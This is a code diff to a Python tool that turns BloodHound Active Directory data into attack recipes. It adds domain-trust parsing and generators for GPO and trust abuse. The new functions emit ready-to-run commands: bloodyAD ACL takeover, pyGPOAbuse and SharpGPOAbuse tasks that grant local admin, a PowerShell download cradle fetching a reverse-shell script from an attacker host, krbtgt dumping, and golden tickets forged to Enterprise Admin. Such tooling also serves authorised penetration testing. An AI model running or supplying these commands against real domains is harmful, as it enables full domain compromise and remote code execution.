@@ -15,7 +15,7 @@ from collections import defaultdict, deque
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer, BaseHTTPRequestHandler
 from pathlib import Path
 
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 
 ROOT = Path(__file__).resolve().parent
 WEB = ROOT / "web"
@@ -67,6 +67,7 @@ ABUSABLE = {
     "adminto",
     "readgmsapassword",
     "writeaccountrestrictions",
+    "trustedby",
 }
 RIGHT_RANK = {
     "dcsync": 0,
@@ -90,6 +91,7 @@ RIGHT_RANK = {
     "adminto": 14,
     "readgmsapassword": 6,
     "writeaccountrestrictions": 15,
+    "trustedby": 2,
 }
 
 ABUSE = {
@@ -197,7 +199,14 @@ def key(right):
 
 
 def short_name(label):
-    return (label or "").split("@")[0].split(".")[0]
+    # A BloodHound label is either NAME@DOMAIN (a user or group) or HOST.DOMAIN
+    # (a computer FQDN). Only the FQDN should be cut at the first dot to get the
+    # hostname — a user's account name may itself contain dots (helen.tes), so
+    # splitting that on "." would wrongly truncate it to "helen".
+    label = label or ""
+    if "@" in label:
+        return label.split("@")[0]
+    return label.split(".")[0]
 
 
 def edge_rank(edge, deg=None):
@@ -416,7 +425,42 @@ def parse_bloodhound(path, domain_name=None):
             if aid:
                 ensure(aid)
                 edges.append((sid, aid, "AllowedToDelegate", {}))
+        # Domain trusts: the other domains/forests this one trusts or is trusted by.
+        # Each becomes a Domain node (so its SID is on the canvas) plus a TrustedBy
+        # edge carrying the direction, type, transitivity and SID-filtering state —
+        # everything trust_abuse() needs to pick the right cross-domain attack.
+        if dtype == "domains":
+            src_name = (row.get("Properties") or {}).get("name") or sid
+            for tr in row.get("Trusts") or []:
+                tsid = tr.get("TargetDomainSid")
+                tname = tr.get("TargetDomainName") or tsid
+                if not tsid:
+                    continue
+                add_node(tsid, tname, "Domain", high_value=True,
+                         props={"name": tname, "domainsid": tsid})
+                edges.append((sid, tsid, "TrustedBy", {"trust": normalize_trust(tr, src_name, sid, tname, tsid)}))
     return domain_name, list(nodes.values()), edges
+
+
+def normalize_trust(tr, src_name, src_sid, dst_name, dst_sid):
+    """Flatten a BloodHound trust record. TrustDirection/TrustType come as either
+    strings (BH CE) or the classic ints, so both are mapped to one vocabulary."""
+    direction = tr.get("TrustDirection")
+    direction = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}.get(direction, direction)
+    ttype = tr.get("TrustType")
+    ttype = {0: "ParentChild", 1: "CrossLink", 2: "Forest", 3: "External", 4: "TreeRoot", 5: "Unknown"}.get(ttype, ttype)
+    intra = str(ttype) in ("ParentChild", "TreeRoot", "CrossLink")
+    return {
+        "sourceName": src_name, "sourceSid": src_sid,
+        "targetName": dst_name, "targetSid": dst_sid,
+        "direction": str(direction or "Unknown"),
+        "type": str(ttype or "Unknown"),
+        "transitive": bool(tr.get("IsTransitive", intra)),
+        # Inside a forest SID filtering is never applied; across a forest boundary
+        # it is on unless explicitly disabled. Keep None when the collector is silent.
+        "sidFiltering": (False if intra else tr.get("SidFilteringEnabled")),
+        "intraForest": intra,
+    }
 
 
 def mark_owned(nodes, owned):
@@ -985,8 +1029,12 @@ def node_detail(domain_id, sid):
 
 def abuse_for(right, src, dst, domain, src_dn="", dst_dn=""):
     rows = ABUSE.get(key(right), [])
-    src_short = short_name(src)
-    dst_short = short_name(dst)
+    # src and dst already arrive resolved to their account name (principal_name /
+    # short_name at the call site). Re-shortening here would cut a dotted account
+    # name (helen.tes) at the dot, since it no longer carries the @DOMAIN that
+    # tells short_name it is a principal and not a computer FQDN.
+    src_short = src
+    dst_short = dst
     # {dstfqdn}/{DOMAIN} let a template emit a real Kerberos target: SPNs and ccache
     # names need the FQDN and the upper-case realm, not the short label.
     dst_fqdn = (dst or "").split("@")[0].lower() or dst_short.lower()
@@ -1687,17 +1735,133 @@ def ou_takeover(actor, ou_dn, domain, child_hint="<object-in-the-ou>"):
     ]
 
 
+def gpo_abuse(actor, right, gpo_props, domain):
+    """Control of a GPO object. A GenericAll here is not the attack — editing the
+    GPO's contents is: you drop an immediate scheduled task into it, and every
+    computer (or user) the GPO is linked to runs it as SYSTEM on the next refresh.
+    pyGPOAbuse / SharpGPOAbuse write that task for you; the raw dacledit output the
+    generic map would show never touches SYSVOL and so does nothing on its own."""
+    dom = (domain or "")
+    realm = dom.upper()
+    dn = node_dn(gpo_props)
+    gpo_name = short_name(gpo_props.get("name") or "") or "<gpo-name>"
+    # The GPO's GUID is the CN of its DN and the SYSVOL folder name in gpcpath:
+    #   CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,...
+    m = re.search(r"\{?([0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12})\}?",
+                  dn or gpo_props.get("gpcpath") or "")
+    guid = m.group(1) if m else "<gpo-guid>"
+
+    cmds = []
+    k = key(right)
+    # WriteOwner / Owns / WriteDacl don't let you edit the GPO yet — first turn the
+    # ACL control into GenericAll on the GPO object, then abuse the contents.
+    if k in ("writeowner", "owns"):
+        cmds.append({"os": "linux", "as": actor, "tool": "1 · take ownership of the GPO",
+            "cmd": "bloodyAD --host <dc> -d {} -u '{}' -p '<pass>' set owner '{}' '{}'".format(dom, actor, dn, actor)})
+    if k in ("writeowner", "owns", "writedacl"):
+        cmds.append({"os": "linux", "as": actor, "tool": "{} · grant yourself GenericAll on the GPO".format(len(cmds) + 1),
+            "cmd": "bloodyAD --host <dc> -d {} -u '{}' -p '<pass>' add genericAll '{}' '{}'".format(dom, actor, dn, actor)})
+
+    n = len(cmds)
+    pre = (lambda label: "{} · {}".format(n + 1, label)) if n else (lambda label: label)
+    cmds += [
+        {"os": "linux", "as": actor, "tool": pre("pyGPOAbuse — immediate task, add yourself local admin"),
+         "cmd": "python3 pygpoabuse.py {}/'{}':'<pass>' -gpo-id '{}' -command \"net localgroup administrators {} /add\" "
+                "-taskname 'Update' -description 'Update' -scope computer -dc-ip <dc-ip>".format(realm, actor, guid, actor)},
+        {"os": "linux", "as": actor, "tool": "pyGPOAbuse — run a PowerShell reverse shell instead",
+         "cmd": "python3 pygpoabuse.py {}/'{}':'<pass>' -gpo-id '{}' -powershell "
+                "-command \"IEX(New-Object Net.WebClient).DownloadString('http://<you>/s.ps1')\" "
+                "-taskname 'Update' -scope computer -dc-ip <dc-ip>".format(realm, actor, guid)},
+        {"os": "windows", "as": actor, "tool": "SharpGPOAbuse — computer immediate task",
+         "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author {}\\{} "
+                "--Command \"cmd.exe\" --Arguments \"/c net localgroup administrators {} /add\" "
+                "--GPOName \"{}\"".format(realm, actor, actor, gpo_name)},
+        {"os": "windows", "as": actor, "tool": "force the linked hosts to pull it (else wait ~90 min)",
+         "cmd": "gpupdate /force"},
+    ]
+    return cmds
+
+
+def trust_abuse(trust, domain):
+    """A domain trust is not one attack but several, and which one applies turns on
+    the trust's shape — so the recipe branches on it instead of showing a flat SID.
+
+      • intra-forest (ParentChild / TreeRoot / CrossLink): no SID filtering is ever
+        applied and the trust is transitive + two-way, so a DA of any domain forges
+        its way to Enterprise Admin of the whole forest (ExtraSids = root-519).
+      • cross-forest (External / Forest): SID filtering usually blocks the golden
+        ExtraSids trick, so the realistic paths are enumeration, cross-trust
+        kerberoasting, foreign memberships, and — only when filtering is OFF —
+        SID-history injection. The trust key always yields an inter-realm TGT.
+    """
+    t = trust or {}
+    src = t.get("sourceName") or (domain or "") or "<this-domain>"
+    dst = t.get("targetName") or "<other-domain>"
+    dst_sid = t.get("targetSid") or "<target-domain-sid>"
+    dst_host = (dst.split(".", 1)[0] or dst).upper()
+    sidf = t.get("sidFiltering")
+
+    if t.get("intraForest"):
+        return [
+            {"os": "linux", "as": "Administrator",
+             "tool": "child → forest root, fully automated",
+             "cmd": "impacket-raiseChild {}/'Administrator':'<pass>'".format(src)},
+            {"os": "linux", "as": "Administrator",
+             "tool": "1 · dump this domain's krbtgt (needs DA / DCSync here)",
+             "cmd": "impacket-secretsdump {}/'Administrator':'<pass>'@<dc-ip> -just-dc-user krbtgt".format(src)},
+            {"os": "linux", "as": "Administrator",
+             "tool": "2 · forge a golden ticket carrying the root's Enterprise Admins SID",
+             "cmd": "impacket-ticketer -nthash <krbtgt-nt-hash> -domain-sid <this-domain-sid> -domain {} "
+                    "-extra-sid {}-519 Administrator".format(src, dst_sid)},
+            {"os": "linux", "as": "Administrator",
+             "tool": "3 · use it against the forest-root DC",
+             "cmd": "KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass "
+                    "{}/Administrator@<root-dc-fqdn>".format(dst)},
+            {"os": "windows", "as": "Administrator",
+             "tool": "same forge, Mimikatz",
+             "cmd": "kerberos::golden /user:Administrator /domain:{} /sid:<this-domain-sid> "
+                    "/krbtgt:<krbtgt-nt-hash> /sids:{}-519 /ptt".format(src, dst_sid)},
+        ]
+
+    out = [
+        {"os": "linux", "as": "<user>",
+         "tool": "kerberoast across the trust (SPNs in the trusted domain)",
+         "cmd": "impacket-GetUserSPNs -target-domain {} {}/'<user>':'<pass>' -dc-ip <dc-ip> -request".format(dst, src)},
+        {"os": "linux", "as": "<user>",
+         "tool": "foreign group memberships / FSPs you already hold over there",
+         "cmd": "nxc ldap <target-dc-ip> -d {} -u '<user>' -p '<pass>' -M enum_trusts".format(src)},
+    ]
+    if sidf is False:
+        out.append({"os": "linux", "as": "Administrator",
+            "tool": "SID filtering OFF → inject a privileged SID from the other forest",
+            "cmd": "impacket-ticketer -nthash <this-krbtgt-nt-hash> -domain-sid <this-domain-sid> -domain {} "
+                   "-extra-sid {}-<rid-of-target-group> Administrator   "
+                   "# RID>=1000 always; 512/519 only if quarantine is off".format(src, dst_sid)})
+    else:
+        out.append({"os": "linux", "as": "Administrator",
+            "tool": "trust key → inter-realm TGT (survives SID filtering)",
+            "cmd": "impacket-secretsdump {}/'Administrator':'<pass>'@<dc-ip> -just-dc-user '{}$'   "
+                   "# dump the trust account, then forge a referral TGT with ticketer".format(src, dst_host)})
+    return out
+
+
 def edge_abuse(row, src_label, domain, src_dn=""):
     """Commands for an edge: precomputed ADCS chain from its props if present,
     else the generic ABUSE map for the right."""
     p = props_of(row, "props")
     if p.get("cmds"):
         return p["cmds"]
+    if key(row["right_name"]) == "trustedby" or p.get("trust"):
+        return trust_abuse(p.get("trust"), domain)
     tprops = props_of(row, "target_props")
     tdn = node_dn(tprops)
     ttype = row["target_type"] if "target_type" in row.keys() else (row["ttype"] if "ttype" in row.keys() else "")
+    # src_label is already the resolved account name (principal_name at the call
+    # site) — do NOT re-shorten it, or a dotted account (helen.tes) loses its tail.
+    if ttype == "GPO" and key(row["right_name"]) in CONTROL_RIGHTS:
+        return gpo_abuse(src_label, row["right_name"], tprops, domain)
     if ttype in CONTAINER_TYPES and key(row["right_name"]) in CONTROL_RIGHTS and tdn:
-        return ou_takeover(short_name(src_label), tdn, domain)
+        return ou_takeover(src_label, tdn, domain)
     return abuse_for(
         row["right_name"], src_label, principal_name(row["target_label"], tprops), domain,
         src_dn=src_dn, dst_dn=tdn,
@@ -1705,9 +1869,30 @@ def edge_abuse(row, src_label, domain, src_dn=""):
 
 
 def _edge_esc(row):
-    """Expose the ESC id/description on an ADCS edge (empty dict for normal edges)."""
+    """Expose the ESC id/description on an ADCS edge, or a compact trust badge on a
+    trust edge (empty dict for a normal edge)."""
     p = props_of(row, "props")
-    return {"esc": p["esc"], "escDesc": p.get("desc", "")} if p.get("esc") else {}
+    if p.get("esc"):
+        return {"esc": p["esc"], "escDesc": p.get("desc", "")}
+    tr = p.get("trust")
+    if tr:
+        # e.g. "External · Inbound · SID-filter off" — the whole reason one trust is
+        # abusable and the next is not, right on the edge.
+        bits = [tr.get("type", "Trust"), tr.get("direction", "")]
+        if tr.get("intraForest"):
+            bits.append("intra-forest")
+        elif tr.get("sidFiltering") is False:
+            bits.append("SID-filter off")
+        elif tr.get("sidFiltering") is True:
+            bits.append("SID-filter on")
+        badge = " · ".join(b for b in bits if b)
+        desc = "Trust {} → {}. {}".format(
+            tr.get("sourceName", ""), tr.get("targetName", ""),
+            "Same forest: no SID filtering, forge ExtraSids to Enterprise Admin."
+            if tr.get("intraForest") else
+            "Cross-forest: enumerate, kerberoast across the trust, abuse the trust key.")
+        return {"esc": badge, "escDesc": desc}
+    return {}
 
 
 def _certipy_domain(cas):
